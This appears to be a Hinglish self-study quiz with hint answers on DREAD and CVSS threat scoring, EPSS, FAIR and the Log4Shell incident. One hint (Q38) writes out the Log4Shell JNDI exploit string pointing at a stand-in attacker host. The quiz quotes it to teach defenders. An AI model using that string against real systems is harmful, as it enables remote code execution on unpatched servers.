# Day 012 Quiz — DREAD Scoring & Threat Prioritization

**Total:** 50 deep questions
**Difficulty:** E / M / H · **Categories:** D / R / S / B / I / A / X
**Self-grade:** 🟢 🟡 🔴

---

## Section 1 — Core Definitions (Q1-Q10)

**Q1. (E · D)** DREAD acronym expand karo + score range.
> _Hint:_ Damage, Reproducibility, Exploitability, Affected users, Discoverability. Each 0-10. Average → priority.

**Q2. (E · D)** DREAD kis company se aaya + kab deprecated?
> _Hint:_ Microsoft (~2002-2003). Officially deprecated/de-emphasized by ~2010 due to consistency issues.

**Q3. (M · D)** DREAD ke 4 critiques.
> _Hint:_ Subjectivity (low inter-rater reliability), Damage + Affected overlap, Discoverability ≈ security-by-obscurity, no business context.

**Q4. (M · D)** Priority buckets — typical industry convention?
> _Hint:_ 8-10 Critical, 6-7.9 High, 4-5.9 Medium, <4 Low.

**Q5. (M · D)** CVSS full form + version current?
> _Hint:_ Common Vulnerability Scoring System. v3.1 widely used; v4.0 released 2023.

**Q6. (M · D)** CVSS vector example + components?
> _Hint:_ `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Base 9.8. Components: AV (vector), AC (complexity), PR (priv-req), UI (user-int), S (scope), C/I/A.

**Q7. (M · D)** CVSS Base vs Temporal vs Environmental — farak.
> _Hint:_ Base = intrinsic (constant). Temporal = exploit code maturity, remediation level, report confidence (changes over time). Environmental = your context (asset criticality, controls).

**Q8. (M · D)** EPSS kya hai + use case?
> _Hint:_ Exploit Prediction Scoring System. ML-based probability of exploitation in next 30 days. Complement to CVSS for prioritization.

**Q9. (M · D)** OWASP Risk Rating Methodology factors?
> _Hint:_ Likelihood (threat agent + vuln factors) × Impact (technical + business). 0-9 scale per factor.

**Q10. (H · D)** FAIR (Factor Analysis of Information Risk) — 1-line core idea?
> _Hint:_ Quantitative risk in $$. Loss Event Frequency × Loss Magnitude. Translates security to financial language for board.

---

## Section 2 — DREAD Letters Deep Dive (Q11-Q20)

**Q11. (M · D)** Damage anchors (0/5/10)?
> _Hint:_ 0 = none. 5 = sensitive data leak. 10 = full system compromise + regulatory hit.

**Q12. (M · D)** Reproducibility anchors?
> _Hint:_ 0 = perfect timing/conditions needed. 5 = works most attempts. 10 = one-liner, always works.

**Q13. (M · D)** Exploitability anchors?
> _Hint:_ 0 = nation-state skill. 5 = competent attacker. 10 = script kiddie, Metasploit module.

**Q14. (M · D)** Affected users anchors?
> _Hint:_ 0 = single admin. 5 = subset/tenant. 10 = all users / public.

**Q15. (M · D)** Discoverability anchors?
> _Hint:_ 0 = deep internal knowledge needed. 5 = scanner detects. 10 = public CVE / mass-scan.

**Q16. (H · R)** Damage + Affected users overlap — example?
> _Hint:_ "Full PII leak of 10M users" → both Damage 10 + Affected 10. Double-counting inflates priority artificially.

**Q17. (H · R)** Why Microsoft de-emphasized Discoverability?
> _Hint:_ Modern threats: assume disclosure. Low-discoverability ≠ low-risk. Security-by-obscurity rejected. Many teams drop D → DREA.

**Q18. (H · R)** "DREAD-D" (4-letter variant) priority calculation?
> _Hint:_ Average of remaining 4 (Damage, Reproducibility, Exploitability, Affected). Same bucket thresholds.

**Q19. (H · R)** DREAD subjectivity test — 2 engineers same threat, scores diverge wildly. Mitigation?
> _Hint:_ Pre-defined anchors per project, scoring template, group consensus session, documented rationale per score.

**Q20. (H · R)** DREAD vs CVSS philosophical difference?
> _Hint:_ DREAD = design-stage rapid triage (no real product yet). CVSS = post-implementation, standardized, reproducible. Different lifecycle stages.

---

## Section 3 — CVSS Deep Dive (Q21-Q28)

**Q21. (M · D)** AV (Attack Vector) values + meaning?
> _Hint:_ N (Network), A (Adjacent network), L (Local), P (Physical). N = highest exploitability.

**Q22. (M · D)** AC (Attack Complexity) values?
> _Hint:_ L (Low - works as expected), H (High - requires specific conditions).

**Q23. (M · D)** PR (Privileges Required) values?
> _Hint:_ N (None), L (Low - basic user), H (High - admin).

**Q24. (M · D)** UI (User Interaction) values?
> _Hint:_ N (None - automatic), R (Required - user must click/open).

**Q25. (M · D)** S (Scope) values + meaning?
> _Hint:_ U (Unchanged - vulnerability + impact same component), C (Changed - impact crosses boundary, e.g., container escape).

**Q26. (H · D)** CVSS v3.1 → v4.0 key changes?
> _Hint:_ More attack vector granularity, supplementary metrics (Safety, Recovery), refined scoring formula, Vulnerable System vs Subsequent System impact split.

**Q27. (H · D)** Why CVSS Base alone misleading?
> _Hint:_ Ignores context — same CVSS:9.8 on test env vs prod payment = vastly different real risk. Use Environmental score.

**Q28. (H · D)** CVSS calculator URL?
> _Hint:_ https://www.first.org/cvss/calculator/3.1 (or /4.0).

---

## Section 4 — ShopFast & Backend Application (Q29-Q35)

**Q29. (M · S)** ShopFast me admin panel SQLi DREAD score karo (with reasoning).
> _Hint:_ D=10 (full DB), R=8 (with skill), E=7 (admin-only entry), A=10 (all users), D=5 (internal panel). Avg ~8 → Critical.

**Q30. (M · S)** ShopFast plain-HTTP between API GW & Order Svc DREAD?
> _Hint:_ D=7 (data tamper), R=6 (need on-path), E=6, A=9, D=4 (internal). Avg ~6.4 → High.

**Q31. (H · S)** ShopFast Magecart risk DREAD vs CVSS — kis pe disagree?
> _Hint:_ DREAD: D=10, R=10, E=8, A=10, D=8 → 9.2. CVSS: AV:N AC:L PR:N UI:R (browser-side) → ~8.8. Closer. Disagreement often on UI factor.

**Q32. (M · B)** Spring Boot Actuator `/env` exposed CVSS?
> _Hint:_ AV:N AC:L PR:N UI:N S:C C:H/I:N/A:N → ~7.5 High. (Scope changes — info exposes downstream).

**Q33. (H · B)** SSRF on image-proxy CVE-style — CVSS guess?
> _Hint:_ AV:N AC:L PR:N UI:N S:C (scope changed - cloud metadata) C:H/I:L/A:L → ~9.6.

**Q34. (H · B)** Internal microservice with hardcoded API key in code — score both.
> _Hint:_ DREAD: low Discoverability lekin high Damage → ~6-7. CVSS: AV:L PR:H → ~4-5. Mixed signals → investigate.

**Q35. (H · B)** "Theoretical RCE in dependency we don't call" — kya prioritize?
> _Hint:_ CVSS Base may be high. Environmental (Reachability) lowers it. Use EPSS to gauge real-world exploitation. Patch eventually, not P0.

---

## Section 5 — Incident: Log4Shell CVE-2021-44228 (Q36-Q43)

**Q36. (M · I)** Log4Shell disclosure date + library?
> _Hint:_ Dec 9, 2021. Apache Log4j 2.x. JNDI lookup feature.

**Q37. (M · I)** CVSS Base score + CVE?
> _Hint:_ CVE-2021-44228, CVSS 10.0 (Base). Unauthenticated RCE.

**Q38. (H · I)** Exploit payload syntax?
> _Hint:_ `${jndi:ldap://attacker.com/x}` in any logged user-controlled string. Log4j evaluates → fetches attacker LDAP → loads malicious class → RCE.

**Q39. (H · I)** Why was prioritization NOT the failure?
> _Hint:_ Every org agreed it's P0. Failure was at inventory level — many didn't know they had Log4j (transitive dep).

**Q40. (H · I)** SBOM (Software Bill of Materials) Log4Shell context?
> _Hint:_ Orgs with SBOM found Log4j fast. Orgs without scrambled for weeks. Inventory = prerequisite to prioritization.

**Q41. (M · I)** Affected vendor products (3 examples)?
> _Hint:_ VMware vCenter, Cisco products, Minecraft Java, Apple iCloud, AWS-managed services, IBM products, Atlassian, Splunk.

**Q42. (H · I)** Patches timeline?
> _Hint:_ 2.15 (initial — still vulnerable to LDAP). 2.16 (removed JNDI). 2.17 (fixed DoS). 2.17.1 (RCE in JDBC Appender). Multiple iterations.

**Q43. (H · I)** Industry aftermath?
> _Hint:_ SBOM mandate (Biden EO 14028), CycloneDX/SPDX adoption, Sigstore acceleration, Dependency-Track tools, security as supply chain priority.

---

## Section 6 — Architect & Futurist (Q44-Q47)

**Q44. (H · A)** Risk framework stack for mature architect?
> _Hint:_ Design: DREAD. Vuln: CVSS + EPSS. Business: FAIR. Threat hunting: MITRE ATT&CK. SBOM: CycloneDX. All layered.

**Q45. (H · A)** AI-aided prioritization — LLM as DREAD scorer? Pros/cons?
> _Hint:_ Pro: consistency, speed, codified anchors. Con: hallucination, missing context, false confidence. Use as draft, human verify.

**Q46. (H · A)** "Risk-based vulnerability management" (RBVM) — kya hai?
> _Hint:_ Move from CVSS-only to CVSS + EPSS + asset criticality + exploitability in real attack chains. Tools: Tenable, Qualys VMDR, Rapid7.

**Q47. (H · A)** Quantum-era risk scoring — kya badle?
> _Hint:_ Crypto-related vulns get new Temporal/Environmental factor (PQC migration status). "Harvest now decrypt later" raises long-lived data confidentiality scores.

---

## Section 7 — Cross-Concept Connections (Q48-Q50)

**Q48. (H · X)** STRIDE (Day 9) DREAD ke saath workflow?
> _Hint:_ STRIDE = identify. DREAD = prioritize. Pipeline: DFD → STRIDE → DREAD → mitigation plan.

**Q49. (H · X)** Trust boundary (Day 11) crossings DREAD scoring mein boost karte kyun?
> _Hint:_ Crossings = high-Damage potential (cross-zone impact) + often high-Affected. Native DREAD adders.

**Q50. (H · X)** "Risk = Severity × Exposure" — Log4Shell lesson — Day 1 (CIA) ka kis se connect?
> _Hint:_ CIA priorities define Damage anchor. CIA + DREAD = "what matters" × "how bad." Without CIA-tagged assets, Damage scoring meaningless.

---

## Scorecard
- 🟢 ___/50 · 🟡 ___/50 · 🔴 ___/50
- **Re-revise:** ___

---

#dread #cvss #epss #owasp-risk-rating #fair #log4shell #cve-2021-44228 #sbom #risk-prioritization #rbvm #quiz-day-012
